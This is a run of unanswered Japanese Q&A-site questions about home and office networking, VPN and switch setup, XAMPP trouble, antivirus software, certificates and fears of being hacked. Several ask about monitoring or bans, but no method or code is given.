他人がＰＣ上で今何をやっているのか、リアルタイムで知れるソフトとかってありますか？ フリーソフトとかで。 あるとしたら、それって何をやっているのか具体的に知ることが出来るのですか？ 例えば「○○にアクセスしてる」だけじゃなく、「○○にアクセスして△△を見ている」とか。 また、監視をされているかもしれない、という時に自分のＰＣは監視されているのかどうか知ることが出来る方法ってありますか？ 有料ソフトは聞くのですが、フリーとか無料のソフトはあるのかどうかよく分からなくて。 教えてください。 よろしくお願いします。
RHEL5でのiptable設定で、 iptablesを無効にしている状態と、以下の設定はイコールで、 All許可で良いのでしょうか。 iptqbles -P INPUT ACCEPT Iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT
VirtualBoxにlinux(ubuntu)を入れています。 ホストOSからゲストであるubuntuにhttpアクセスしたいので、 ubuntuに固定ローカルIP(192.168.56.101)を割り当てたいのですが、うまくいきません。 ネットで調べて、とりあえず以下のようにコマンド実行してみましたが、 正直コマンドの意図は解らずに実行しています。 有識者の方、どうかご教授お願い致します。 ------------------ $vim /etc/network/interfaces # The Loopback network interface auto lo iface lo inet loopback # The primary network interface iface eth1 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 :wq $ sudo /etc/init.d/networking restart * Reconfiguring network interfaces... [ OK ] $sudo vim /etc/hosts 192.168.56.101 guest :wq /sbin/ifconfig lo Link encap:ローカルループバック inetアドレス:127.0.0.1 マスク:255.0.0.0 ------------------ ↓ ローカルIPに192.168.56.101が割り当てられていない。
現在2DKの間取りにてデスクトップPCを無線LANにて使用中です。(ADSL) YBBの無線LANパックに加入中ですが毎月8000円強かかっています。 プロバイダ変更を検討中だったんですが、 偶然アパートが工事で無料にて光が使えるようになりました。 今日、工事が終了し「LANケーブルを差し込めば使えるようになっています」 とのことでしたが、そこは寝室でケーブルを引くにもちょっと遠いし 子供が怪我するのも嫌なので無線にしたいと考えています。 そこで現在と同じような環境のようにしたく 子機付き親機のルーターを買おうと思いますが http://kakaku.com/item/K0000292864/ あたりでよいのかわからず質問しました。 壁のLANの穴(？)からLANケーブルを直接ルーターと繋ぐんでしょうか？ モデムは必要ないのでしょうか？ /壁/LANケーブル/ルーター/無線LAN(親機)/PC(子機) ↑わかりずらくてすみません。 このようなイメージですが合ってますでしょうか？ その他、無線で使用中のもの プリンタ、スマートフォン、DS、Wiiなどです。 漏れなどありましたら追記させていただきますので ご存知の方いらっしゃいましたら教えてください。 よろしくお願いいたします。
はじめまして、私のパソコンのＯＳはWindows7です、ドライブをＣ，Ｄ，Ｆの３ 分割で使っています。 XAMPPのインストールに失敗ばかりで、今まで４回ほど試みたのですが１回も成功 した事がありません。 今回はＥドライブにインストールして、直ぐにXAMPP Control Panelを立ち上げる と、パネルの後半部分に 　[apache] Apache Service Detected With Wrong Path [apache] Uninstall the service manually first [mysql] MySQL Service Detected With Wrong Path [mysql] Uninstall the service manually first と、エラーメッセージのような内容が赤文字で記述されています。 さらに！コントロールパネル→管理ツール→サービスを開いてみると、 【Apache2.4]の名前がはっきり載っています、 これをダブルクリックしてプロパティを開いてみると、パネルの中央付近（【説 明】と【スタートアップの種類(E)】とのあいだの所）に……、 　　実行ファイルのパス: 　"d:\xampp\apache\bin\httpd.exe" -k runservice と記載されてあるのです？？。 インストール先はＥドライブなのに、なぜ "d:\xampp\apache….exe"と 記載されているのか分かりません。 更に!更に! mysqlの名前を見つけて、ダブルクリックしてプロパティを開いてみ ると、実行ファイルのパス：の下に（ダブルクォテーション""こそファイルの前 と後ろにないのですが…） 　C:\xampp\mysql\bin\mysqld.exe --defaults-file=C:\xampp\mysql\bin \my.ini mysql と記載されてあるのです？？。 また、別の現象？として…、私のパソコンのデスクトップに表示してある「エキ サイト翻訳」と「英和辞典Weblio辞書」のアイコンをクリックすると、（今まで は一発クリックで開けたのですが… 　【このインターネットショートカットを開けません。プロトコル"http"には登 　　録されたプログラムがありません。】 と言うエラーメッセージがXAMPPをＥドライブにインストールした後から表示され るようになったのですが……、 XAMPPのバージョンは XAMPP-win32-1.8.0-VC9-installer.exe •Apache 2.4.2 •MySQL 5.5.25a •PHP 5.4.4 •phpMyAdmin 3.5.2 •FileZilla FTP Server 0.9.41 •Tomcat 7.0.28 (with mod_proxy_ajp as connector) •Strawberry Perl 5.16.0.1 Portable •XAMPP Control Panel 3.0.12 (from hackattack142) 　現在のXAMPP Control Panel v3.0.12 の状況は 　　　　Servics　　　　Apache MySQL共にチェックマークがあります。 Module 　　　MySQLのみ、薄い緑色のバックグラウンドカラーガある PID(s) Apache 記入なし　MySQL　　2084 Port(s) Apache 記入なし　MySQL 3306 　　actionボタンは, Apache MySQLいずれも何回押してもまったく反応なし！ 尚、上記の状況で、サービスのMySQLのプロパティを開いて、サービスの状態の 【開始(s)】をクリックすると、 　　　　ローカルコンピューターのmysqlサービスを開始できません。 エラー２：指定されたファイルが見つかりません。 　とエラーメッセージが表示されます。 　どなたか？このような状況の私のパソコンにＸＡＭＰＰをインストールする方 法をお教えください。よろしくお願いします。
昨日、電気会社の人が電気メーターの交換をされていかれました。 そのあとからipadがネットに接続できなくなりました。 再起動や再設定をしてみてはいるんですが、つながりません。。。。 通信機器・使用環境は ｙａｈｏｏBBの50M バッファローのＷＨＲ－Ｇ３０１Ｎ にてipad2を使用していました。 どうしたらつながるか教えてください。
今　無料のキングソフトを使用しています。毎日スキャンしてくれていますし 先日は木馬のトロイも発見してくれて　しかも速攻削除でき　素早いチェックと対応で　ありがたく愛用させて頂いています。 あと　ヤフーのメールセキュリティパックにも入っていますけれど（毎月約300円）、一つのパソコンで　二つのセキュリティパックは必要ないのでしょうか？ もうこのヤフーのパックを4年使用しているのですけれど 年間で3600円ですので　今後使い続けると ひとつの有料のパックを購入したほうが 金銭的にも助かるので キングソフトだけで　大丈夫であれば　それだけで行きたいと思います。 あと　キングソフトで満足していますけれど、使用されている方で 何か　このフリーセキュリティソフトで問題があったかたがみえましたら 教えて頂けると有難いです。 よろしくお願い致します。 ありがとうございます。
初めまして。ayonahada22です私はgreeに強制退会で。メアドを変えた。登録をしようとしたらこの 携帯は。ご使用禁止にされています。って書かれてました。なぜだろうか。私が読谷村内で。出会いを求めたからです。 なぜ？出会いは行けないのか考えたら。前にその起こした人がやったからです。そうなんです。gree FAMEカード扱わなくては行かないんですか？私の携帯は。年齢認証ができないから。なんでしょうか？auの１５才未満の方が。やったと書かれて。 居て。はて？私は２２才なのにそんなはず無いと思っています。との事です。gree強制退会復活方法 簡単便利なカード買わなくてもすむ方法と。アクセス制限を起きた事実を教えて下さい。 auで１５才未満のになっていますけど。誰か。私の携帯使いましたかね？ gree強制退会復活方法とアクセス制限対象方法を教えて下さい！？
一昨日から急にインターネットに接続ができなくなりました。 ネットワーク共有センターを開いて見たら PC---ネットワーク-×-インターネット っとなっていました ルーターが原因かと思い電源を抜き一時間放置しまた接続しましたが治ってませんでした Windows ネットワーク診断をやってみたら アクセスポイント、ルーター、またはケーブルモデムとインターネット間の接続を中継しました っと出ていました どうやったら治るのでしょうか？ ご回答お願いします
facebookを利用していたのですが1年くらい使用してませんでした 久々にログインしようとしましたがメールアドレスを忘れてしまいました。 どなたかログインできる方法を知ってる方はいませんか？
ジャンカラがＰＣ持込がＯＫで、au Wifi Spotでつなぐことができるようです。 その際の危険度について質問です。 無線lanのアクセスポイントを検索して、無料でパスワードもなく、つなぐことができる アクセスポイントにつないだら、罠だった。というのを何かで見た気がするのですが。 今回、私が自分のパソコンをつなごうとしているのは、ジャンカラ内の、しかもauのアクセス ポイントであるから、何も危険はないだろうと思っているのですが、大丈夫でしょうか。 こういう危険がある。などありましたらアドバイスいただけるとうれしいです。
学校のpcで自作レーベルのダウンロードは問題ありますか？ 大体どこら辺まで監視されていて、どこまででラインがあるのかが、いまいちわかりません。 備考、ICカードでのログインがあります。
ＮＡＳのことを調べるのですが、もう少し分かりません。 分かっていることは自宅において共有サーバを構築するようなもので、 無線ＬＡＮがあれば、アンドロイド携帯、ＭＡＣ、ウインドウズなどのパソコンから 無線ＬＡＮを介して外付けＨＤディスクとして利用することができるといった漠然とした認識です。 その用途手段において、外部（外出先から）から自宅のそのＮＡＳに向けてファイルを転送、保存（バックアップ）することは可能なのかということです。 外出先からは多分アンドロイド携帯のテザリングを利用してネットに繋がったパソコンのデータを自宅のＮＡＳに保存したいのですが可能でしょうか。 携帯からデータを保存できるならばそれを介したパソコンのデータも保存できるはず。 しかし先日、店頭でＮＡＳのことを聞いていると外出先からのネットを介しての保存はセキュリティ面で甘くなる(危険性が増す）とのことで気をつけることが必要（セキュリティソフト対策でしょうか） 上記の方法で自宅のＮＡＳを利用するならもっとセキュリティソフトなどの対策も必要なのでしょうか。 現在手持ちのアンドロイド携帯はセキュリティソフトらしきものは一切使用していないのが現状です。 よろしくおねがいします。
VPNについてご教授ください。 LAN⇔シスコルーターA　⇔シスコルーターB　⇔　catalystスイッチ⇔端末(windowsVista) と物理構成を作成しております。 <構想> A…WANとLANの境界ルーター。Aより内側はLANとしています。 B…Bは、WANにあるルーター。 スイッチ…Catalystスイッチ。LANの口増強用。 端末…ノートパソコン(=インターネットからアクセスしてくるリモート端末と想定) この時、 1、ルーターAにVPN設定を入れました。 2、Cisco VPN clientをノートパソコンに入れました。 ルーターA　と　ルーターB　は、「172.17.0.0/30　ネットワーク」 ルーターBの配下に、172.17.10.0/24ネットワーク　を作成しております。(DFGは、172.17.10.254) 端末には、172．17．10．1　IPを割り振っております。 端末から、VPNClientを起動し、 ルーターから、「172.17.3.1/24」IPが端末に新たに割り当てられました。 →これは設定したとおりに正しく動いております。 マイネットワークを確認したところ、 「ローカルネットワーク = LANカード」 「CiscoSystemVPNアダプター = VPNLAN」 の二つに増えていました。(インストールしたので当然なのですが) <質問> ノートパソコンは、 「VPNアドレス…172.17.3.1」と、 「もとから用意したアドレス…172.17.10.1」 を保持しております。 VPN接続前の、「172.17.10.1のみ保持しているとき」に 実は、Aルーターの中、「LAN：192.168.11.100」にpingをうつとpingが通りました。 (リモート設定を想定しておりますが、一応疎通確認のため172.17.10ネットからはpingが通るようにルーティングテーブルを設定しております。) VPN接続後の、「172.17.3.1」「172.17.10.1」を保持しているときに Aルーターの中、「LAN：192.168.11.100」にpingをうつとpingが通らなくなりました。 【VPN接続後、pingが通らなくなったのは、NICの優先度みたいなものが変わったことによるものなのでしょうか？】 →VPNLANの方が優先度が高くなった？ もし優先度みたいなものがあるのであれば、【変更したりするにはどうしたらよいのでしょうか？】 ※172.17.3.0/24ネットワークについては、ルーティングテーブル等を作成していないので 　通信は通らないという現状です。
常時ネットワークで稼働（電源入っている）しているswitch_Aとswitch_Bとswitch_Cがあります。 それらは三角形に２本のクロスケーブルで接続されています。 A→B→C→Ａ→B…） この電源ON状態でイーサチャンネルの設定を試みましたが、 誤って、手順を間違えたせいかブロードキャストストームが起きてしまいました。　 手順が原因だと思いますが実際に正しい設定手順と仕組みを教えて下さい。 　　　※switch_Aの設定でchannel group2 onした直後に発生 　　　※A(11-12)-B(13-14)接続　B(11-12)-C(11-12)接続　C(13-14)-A(13-14)接続 ( )はport int range fa 0/1 - 10 switchport access vlan 1 switchport mode access spanning-tree portfast int range fa 0/11 -12 switchport access vlan 1 switchport mode access channel-group 1 mode on int range fa 0/13 -14 switchport access vlan 1 switchport mode access channel-group 2 mode on int Port-channel1 switchport access vlan 1 switchport mode access int Port-channel2 switchport access vlan 1 switchport mode access int Vlan 1 ip add 192.168.1.11 255.255.255.0 no ip route-cache no shut
って出来ますか？ ここ最近の出来事ですが、 チャットする際にWebカメラを付けているんですが、3日程前からたまに急にズームになったり戻ったりしてました。怪しく思い、手でカメラに向かって指を指すと、ズームの場所が上や横に移動しました。そのあと元に戻りそれからは一切勝手にズームになっていません。今日もならなかったです。 ハッキングされてるのでしょうか？ ちなみにカメラはロジクールです。 問い合わせで聞いてみると、手動以外では、カメラが勝手にズームになったりする機能はないみたいです。 ただ、壊れているのか、 外部から侵入されているのか。 詳しい方回答よろしくお願いします(*_*)
ネットワークのセグメントについてお聞きしたいんですが、ルーターの下にセグメントの違うPCを繋げるにはどうしたらいいんでしょうか？ 市販の安いバッファロールーターではだめでしょうか。 たとえば 192.168.10.●と192.168.13.●というネットワークがあるとしてルーターが192.168.10.1だった場合 192.168.13.●のIPがふられているPCはどうやってルーターの外に出るのでしょうか？ デフォルトゲートウェイが192.168.10.1の場合192.168.13.●のPCはインターネットができないと思うんですが、Ciscoのような高価なルーターは設定で出来そうですが、安いバッファロールーターではだめでしょうか？ お解りかりの方がいらっしゃいましたらよろしくお願いします。 またCiscoルーターで出来る場合の仕組みはどうなっているんでしょうか？よろしくお願いします。
msnからmsn相談箱へアクセスできず、待機状態が続きます。 アタックブロックのログにはSYN Flood to Host (PPPoE1-Out)が表示されており、アタックの相手先アドレスはOKWaveになっています。 gooからだと問題なく相談箱にアクセスできますし、msnのほかのサービスにも問題なく繋がります。 msnからmsn相談箱へのアクセスのみができません。どうしてでしょうか？
今度、skype通話しながら、skypeの画面共有を利用し、やりとりしようと思っています。 skypeでやりとりすることにより、こちらのIPアドレスなどを調べられ、こちらのＰＣに 侵入されるなどの危険はないでしょうか。 もし危険があるとしたら、どのような対策をとるのがいいでしょうか。 現在セキュリティソフトは、NTTの光フレッツに入っているので、その際送られてきたNTTの CDROMからインストールした、NTTのセキュリティソフトを使用しています。 NTTのセキュリティソフトを入れてさえいれば特に心配することはないでしょうか。
メインPCにwindows7 SP1 Pro x64を使っています、このPCの特定のフォルダを家庭内の別PC(Windows)やAndroidのESファイルエクスプローラなどで共有しています 今現在はメインPCにいつもログオンしている管理者権限アカウントとは別に共有用アカウント（標準ユーザー権限）を仮にShareUserとして作り、パスワードを設定し そのアカウント名とパスワードを入力して接続しています 自分で自分のメインPCに接続するときは自分だけ知ってるアカウントとパスワードを使えばいいのでこの方法で十分だと思うんですが 家族にパスワードやアカウント制限なしでファイルを共有したい時の設定がわかりません また、家庭内LAN構成には無線ルータを使っていてWPA/WPSパスワード設定済みで使っていますが この状態でパスやアカウント制限なしでのファイル共有をするのは危険でしょうか？ 自分用共有フォルダ(ShareUserと管理者のみ読み取り/書き込み) 家族用共有フォルダ(ローカルネットワーク内で無制限に読み取り)
数日前までyhoo知恵袋で活動していたのですが、突然アクセスできなくなってしまい「Google Chrome では chiebukuro.yahoo.co.jp が見つかりませんでした」と出るようになってしまいました。 yhooジャパンにはアクセスできます。メールなどもできます。 アクセスできなくなる数分前までは普通に質問したり、回答してました。 突然だったので困ってます。 機械音痴で、よくわからないので原因になりそうな事を教えてもらえると嬉しいです。
httpsでの通信ですが、何が平文で流れているか知りたいと思っています。 宛先は平文でしょうか？またWebサイトであればページまででしょうか？ 他に何が平文で流れるのでしょうか？ 是非よろしくお願い致します。
Windows→linuxにsshでアクセスして、guiを起動させています (teratermを使ってsshでアクセスして、Windowsからgmone-sudokuを起動して遊ぶ、など) WindowsではXmingというXサーバーを使っています MacはBSDベースのOSでもとからXサーバーがはいっているようなのですが、 Macの場合、別途ソフトウェアをインストールしなくても、 sshでアクセスしてxアプリを起動することはできますか?
　携帯のセキュリティーに疎いので詳しい方教えてください。 携帯メールに添付されたtxtファイルに、ハッキングやクラッキングのファイルを潜ませることは可能なのでしょうか？ 　というのも、先日知人から不可解な間違いメール（softbank携帯から）が来て、そこにtxtファイル（0.1KB）が添付されていました。txtファイルを開くと勝手にSD内部にファイルが飛ばされ、そこから開くと文字化けしていました。 　その知人とは少々もめごとがあったので、若干不安です。情報が漏れている感じもします。 もしそのようなことが可能ならば、そのtxtファイルがハッキングやクラッキングのファイルなのか判別する方法やツールはありますか？また、排除する方法はありますでしょうか？ 詳しい方にはアホな質問なのかもしれませんが、ご回答いただけますと幸いです。 よろしくお願いいたします。
異なるセグメントを設け、互いに通信可能にしたいと思っております。 図のようにネットワークを構築した場合、例えばPC1からPC2へ通信を行うにはどのようにすれば良いのでしょうか？ (ルータの△の上側はWAN側、下側がLAN側です。) そもそも図のような構成は誤り、という場合構成についても指摘おねがいします。 ■試してだめだったこと ルータ1に対し、スタティックルーティングの設定を実施。内容は、192.168.2.0/24に対してのアクセスはゲートウェイを192.168.10.20とするように設定。 同様にルータ2も192.168.1.0/24に対してゲートウェイ192.168.10.10に設定 結果：通信できず ■環境 ルータ1、2：Buffalo製WZR-AMPG300NH PC1/2ともにWindowsXP ■考慮したいこと PC1、PC2の数はそれぞれ1台ではなく増やせるようにしたい。 よろしくお願いします。
このたびBフレッツの回線契約をすることなりました。 プランはUnnumberedで固定IP8です。 事前検証ということで、以下の機器を用いてキャリア側のPPPoEサーバを構築したいと考えております。(クライアント側ではなくキャリア側のサーバです。) 機器：cisco831(version 12.3) いろいろ調べてみたのですが、 サーバ側の設定は1IPやUnnumberedではない設定は探せたのですが、 Unnumberedで固定IP8の設定を探し出せませんでした。 どなたか設定例、もしくは設定が乗っているWebページをご教授願いませんでしょうか？ よろしくお願いします。
知り合いのスマートフォン(au)なのですが、いきなりウイルスバスターモバイル for auスマートパスという画面になり、携帯端末は現在保護されていますと表示されて 操作不能となり、電源も切れない状態になってしまいました。 電話はくれば出れますが、自分からはかけれません。 こんな状態は初めてなのでどうすれば元に戻るのかわかりません。 アドバイスお願いいたします!
現在以下の内容をローカルで繋いてリモートアクセスのVPNテストを行っています。 PC1→(LAN2)YAMAHARTX1200(LAN1)→PC2 PC1にYMS-VPN7をインストールしました。 VPNを接続する前にPC1からPC2へPingをすると応答はOKなのですが、 その後PC1からリモートアクセスでVPN接続すると、Pingが通らなくなります。 ファイアーウォールは特に設定していません。 原因が分かる方がいらっしゃいましたら教えていただけますでしょうか。 宜しくお願い致します。
『前回使ってから NT Kernel System に変更がありました。これはユーザが最近更新した場合に起きる可能性があります。ネットワークアクセスを許可しますか?』 というものが出てきました。 詳細を見ると、 前回 ntoskml.exe を使ってから実行可能ファイルが変更されました とあり、その下にはIPやパケットの詳細等が書かれています... が、よくわかりません。 これは許可しない方がいいのでしょうか? ウィルスか何かなのでしょうか? 教えてください。よろしくお願いします。
常識だと思いますが、ネットワーク初心者のためご容赦ください。 現在、管理LAN用のL2スイッチが１台あるのですが、 機器追加をすることになり、ポートが足りなくなります。 L2スイッチもう一台追加購入した場合、既存のL2スイッチを 拡張する意味合いで使用することは可能でしょうか？ （物理的に２台のL2スイッチがある場合、同一セグメントとして使用できるか？）
Windows7のWireshark1.8.2の質問です。 画面キャプチャ http://sourceforge.jp/projects/wireshark/images? … 上記の画面での、上から二ペイン目(「Frame 11～」や、「Ethernet ～」,protocolなどが表示されている部分)に表示されているテキストを全部コピーしたいのですが、一行ずつしかコピーできません。 一ペイン目でエクスポートしたいパケットを選択して、 File->Export Objectを選ぼうとしてみても、Export Objectがグレーになっていて選択できません。 二ペイン目に表示されているテキストをそのまま全部コピーする方法はありませんか？ よろしくお願いします。
会社のHPにアクセスした場合、 そのHPの管理者には、こちらの情報がどの程度分かるのでしょうか？ 例えばブログを管理していると、一日の訪問者数や、 訪問者が自分のサイトをどんな文字で検索してアクセスして来たか？などが分かるそうですが。 メールのようにIPアドレスが表示されてしまうとか、 どの地域からのアクセスなのか、とか そういうことが分かるのですか？ 教えて下さい。
以下はヤフーメールから送信したメールが、届かずに帰ってきたものです。 しかし、メール本文以外の文が追加されており、何かプログラムなのかと思ったのですが、私には知識がなくわかりません。 最近メールを出しても帰ってこないなどのことがあり、気になっています。 全く問題ないのかもしれませんが、どなたか知識のある方で、以下の文の意味が分かる方、よろしければ教えていただければ助かります。 下記のメールアドレス宛のメールが、配送できませんでした。 以下にメールサーバーからのエラーメッセージを記載いたします。 = エラーメッセージ <送信先アドレス>: Sorry, I wasn't able to establish an SMTP connection. (#4.4.1) I'm not going to try again; this message has been in the queue too long. = Original message follows. = 以下、エラーとなったメール本文です Return-Path: <自分のアドレス> Received: (qmail 42705 invoked by uid 60001); 3 Sep 2012 08:40:27 -0000 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.co.jp; s=yj20110701; t=1346661627; bh=iXjFLSPZKkLvdcP248hDOSB3uglUMNKiUm03jT8ENyw=; h=Message-ID:X-YMail-OSG:Received:X-Mailer:Date:From:Subject:To:In-Reply- To:MIME-Version:Content-Type; b=HwM6MOwGotx93oN7RTuljcU7aHorc0phEzMu0SEpUg7X26nB8vpT1hmzfmeIn6npN04SQBfBlCbFkW Lls +VyBep222bgrmwr82cKUOBRdmTSz9Vj5YXQ8q/zhxLbiBHrm4aOBgZS9+kMj2rllB6IIf8otQA/MGhYJ EHRr0heT9A= DomainKey-Signature:a=rsa-sha1; q=dns; c=nofws; s=yj20110701; d=yahoo.co.jp; h=Message-ID:X-YMail-OSG:Received:X-Mailer:Date:From:Subject:To:In-Reply- To:MIME-Version:Content-Type; b=bCM4PoiFK3tUhYIwZ8rVh5dsp4TNix4YBF5roszhh/5dD/2U8V3xNSN9raNSlGgDfJlFph6ETaVKGP 3CibhLTxVK/TICmgrEZ8bPvNVMD3hDx3Ipyu8qJ2znQfnNAzY40z7WJT3Oqv6qPqnwkvUaFvuT0g2Nh7 o5h7DBLPRGCtM=; Message-ID: <124504.38474.qm@web101002.mail.kks.yahoo.co.jp> X-YMail-OSG: MgkLPKIVM1mDIQ6uG8b9Y8RE5PgrnOHYMby9dsxkIJtsSwJT.AIc69wsnULBXTnajkPXnuNgODSf81lf r_SscyDZLRbqU_N0MqriAlUOK5cXXEtNXcm.z6lL2pyPDm11KOvaKcOOP.RyXjzpAbCk5ZtCBYJ_eCxW S4wZ.qjkRP6SAM0HghmbP13kSKS0bcTNwtpA_le5m15JyA54SXa6NqB1FnkwhgFtMuBv1PQo0NPAErGo ZvnlTwbgfmORqUPpXqIPsFv27w-- Received: from [121.2.102.187] by web101002.mail.kks.yahoo.co.jp via HTTP; Mon, 03 Sep 2012 17:40:26 JST X-Mailer: YahooMailClassic/6.0.19_59 YahooMailWebService/0.8.111_27 Date: Mon, 3 Sep 2012 17:40:26 +0900 (JST) From: 送信したアドレス Subject: Re: 題名 To: 相手先アドレス In-Reply-To: <20120903003324.22977.qmail@web20.primehs.net> MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="0-1340856342-1346661626=:38474" --0-1340856342-1346661626=:38474 Content-Type: text/plain; charset=iso-2022-jp 送信したメッセージ --0-1340856342-1346661626=:38474 Content-Type: text/html; charset=iso-2022-jp <table cellspacing="0" cellpadding="0" border="0" ><tr><td valign="top" style="font: inherit;">文章<br><br><br>文章<br>文章<br>文章 <br></td></tr></table> --0-1340856342-1346661626=:38474--
ポート開放のやり方がわかりません。1からお願いします。 ポート開放くん？があったのでそれでのやり方をお願いします ・windows7 ・特にウイルス対策ソフトは入れてません ・ネットは有線接続です ・Minecraftで使います
CSR ファイルを作る際に必要な「秘密鍵ファイル」って、「サーバの公開鍵」なのでしょうか？ http://www.ibm.com/developerworks/jp/websphere/l … こちらのサイトの説明だと、CSRに埋め込まれる鍵は、サーバの公開鍵です。 しかしながら、こちらの手順書 https://www.cybertrust.ne.jp/SureServer/apply/Ap … において、CSR ファイルの作成に必要なのは「秘密鍵ファイル」と呼ばれるファイルです。 とても混乱しているのですが、本当はどうなっているのでしょうか。 自分としては、「秘密鍵ファイル」は、そう呼ばれているだけで、中身はサーバの公開鍵が含まれている。 というふうに思っています。 これは間違いでしょうか。
先週あたりからPCの調子がおかしいなと思い、きょうPC（OS：ウィンドウズ７）を起動したら、カーソルの隣のみずいろの円が一秒置きくらいに点滅するようになりました。 気持ち悪いのでいろいろ調べてみると、タスクバーのアイコンの中に見たことのないアイコン（PCの中に進入禁止マークのようなもの）がたくさん出てきて何十個にもなっています。 それはついたり消えたりしていて、いつも常駐するようになっています。 フリーソフトのavast!やSpypodで削除しようとしているのですが消えてくれません。 これはウイルスでしょうか？ 同じような症状に遭われた方がいたら教えてほしいです。 よろしくお願いいたします。
outlook2010でメールがいっぱいになってきた場合、上手に保存する方法はないでしょうか。 かなりメールが増えてきてしまっているのでネットワーク上に置くことが困難になってきました。 個人用フォルダでも作ればいいのですが、それは作れない理由があるので別方法で考えています。 また、別のサービス（GoogleとかYahooのWEBメールサービス）はとある理由で使えないので、これもまた除外します。 例えばPDF化などできたらいいような気もしますが、件数が多いためいちいち印刷するのも悩みどころです。 なにかいい保存手段はないでしょうか？
現在個人的に、PKI（公開鍵基盤）を勉強中です。 PKI（公開鍵基盤）のテキストを読むと、だいたいCA（Certificate Authority)は階層構造になっていて、ユーザが、取引先の電子証明書（公開鍵証明書）の正当性を近くのCAに照会に行くと、取引先の電子証明書の正当性をチェックして返答すると同時に、CAが自らの正当性を証明するために、（CAがなりすましでないことを証明するために）、順次、上位のCAに照会をかけ、最後にルートCAにたどり着くと、ルートCAは自らの秘密鍵で自己署名を行って、その自己署名で、CAになりすましがないことを最終的に担保すると書いてあります。 そのような長いトランザクションを、取引先の電子証明書の正当性をチェックする都度行っていると、時間がかかりすぎて実用に耐えないような気がします。 もしかして、実際のCAは階層構造ではなく、ほとんど我々は、ルートCAに直接照会をかけているのでしょうか。
Windows 7 Home Premium 64bitの端末のネットワーク画面に、共有している他のパソコンやサーバーが表示されず困っています。アドレスバーでIPを入力すると接続は可能です。 ただ、なぜか常に1台のパソコンだけネットワークに表示されます。 ・ネットワークに表示されないパソコンとサーバ　⇒　PC：Windows7 Pro 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　サーバ：Windows server 2008 R2 ST ・ネットワークに1台だけ表示されているパソコン　⇒　Windows Vista ～ 32bit（OS名の詳細は不明。） 対象の端末の設定について、以下は確認しましたが、解決しません。。。 (1)パブリックネットワークになっていないことを確認。 (2)ネットワークと共有センター内の、「ネットワーク探索」が有効になっている事を確認。 (3)ローカルエリア接続のプロパティで、「Microsoftネットワーク用クライアント」にチェックが入っている事を確認。 (4)IPv6のチェックを外す。 (5)コンピューターの管理内の、「computer browser」、「work station」が開始になっている事を確認。 (6)IPv4のプロパティ内にあるTCP/IPv4のプロパティの詳細設定でWINSのNetBIOSが有効になっている事を確認。 (7)「Link-Layer Topology Discovery Mapper I/O Driver」と「Link-Layer Topology Discovery Responder」にチェックが入っている事を確認。 以上の事を試しましたが、解決しません。 ちなみにウイルスソフトはシマンテック社のEndpoint Protectionをインストールしています。 ウイルスソフトの可能性も疑いましたが、ウイルスソフトの設定で共有がブロックされているのであれば、全ての端末が表示されなくなると思うのですが。。。Windows Vistaの端末のみ表示されている為、OS上の仕様が影響している可能性はあるのでしょうか？ 可能性のある原因を是非教えて頂ければと思います！ 宜しくお願い致します。
Linuxでサーバ10台・クライアント１台構成で、クライアントから各サーバにsftpでファイルをGet/Putするシステムを考えています。 サーバに秘密鍵を作成しようと思いますが、サーバ10台分の鍵コードを管理するのは大変なので、１台のサーバで作成した鍵コードを他のサーバにコピーして使用する事が可能でしょうか？ また、注意点があれお教え願います。 (ネットは外接しません。固定IPアドレスです。）
突然、ネットに繫がらないようになってしまいました。 パソコン：OSwindows7　DELL　XPS 無線LAN　WZR-HP-G302H/U　子機使用 192.168.11.1にアクセスできません。 また、もう一台のノートPCだと無線LANで同じ場所からも繋がります。 ノートPC：ASUS　無線LAN内臓　192.168.11.1にもアクセスできます。 無線LANが悪いのかと思い、 ネットで調べてトラブルの時の対処法はいろいろ試してみました。 しかし、もう一台のノートが普通に繋がるので、 無線LANが原因ではなく、パソコン側に原因があるのかと考えて、 こちらもいろいろ試しているのですが、解決しません。 無線LANの電波は届いてます。しかし、 192.168.11.1に接続できません。 デフォルトゲートウェイは192.168.11.1です。 あまり詳しくないのですがよろしくお願い致します。
自作PCについて 自作PCを作ろうとしていますが ウイルス対策についてよくわかりません 入れなければどうなるのか、 無料で入れられるのか、 そこらへんがあまりにもわからなくてどう質問していいのかもわかりません。 とにかく自作PCを作るときにどんなふうにどこでかえばいいのかいろいろおしえてください
今までAvastを入れてきたのですが、ａｖａｓｔのファイヤーウォール機能はおまけ程度と聞きまっした。ファイヤーウォールはアンチウィルスソフトとは別に入れるものなのでしょうか？またアンチウィルスとファイヤーウォールのどちらも優れたソフトがあったら教えて下さい。
AVG Anti-Virus Free Edition for Linux をCentOSにインストールしてみようと思いました。 しかし、ライセンスを読んでも「非商用かつ、個人が単独のシステムで利用する場合」という表現が今一つよくわからなかったので、どういう解釈をすればいいのか質問します。 具体的には自宅サーバーにこのソフトをインストールして使うことは可能でしょうか。 条件は、管理者は個人(質問者1人)、公開するWebコンテンツは学校の仲間内だけでのBBSとメーリングリストだとします。 よろしくお願いします。
はじめまして。お知恵を貸してください。 NW機器(L2SW or L3SW or ルータ)のコマンドのカスタマイズをしたいのですが可能でしょうか？ 例えばこんな感じで日本語を返したり、、 ------------------------------------------------------------ #ping "今日のご飯"　　←実行コマンド #Reply from カレー！　:bytes=32 time<1ms TTL=128　←応答 ------------------------------------------------------------ こんな感じで記号を返したり、、 ------------------------------------------------------------ #traceroute "love"　　←実行コマンド # #　　###　　#### ←応答 #　#　　###　　### #　#　　　#　　　## #　　#　　　　　# #　　　#　　　## #　　　　#　## #　　　　　# ------------------------------------------------------------ 可能ならば下記教えていただきたいです。 (1)方法は？ 　（スクリプトを作るなど。できればどんなスクリプトか具体的に教えていただきたいです・・） (2)実装可能な機器は？ 　(●●社のこの型番の製品ならOK/NGなどの情報があれば教えてください。） 真面目に方法を探しているのですがふざけた質問に見えたら大変恐縮です。 よろしくお願いいたします。
このごろネットサーフィンをしていると、ときどき急にページがカラフルな色の画像（添付してある画像です）になってしまいます。更新やブラウザの大きさを変えれば元に戻るのであまり問題はないのですが、ウイルスだと怖いのでどなたか原因を知っている方がいましたら、ぜひ教えてください。よろしくお願いします。
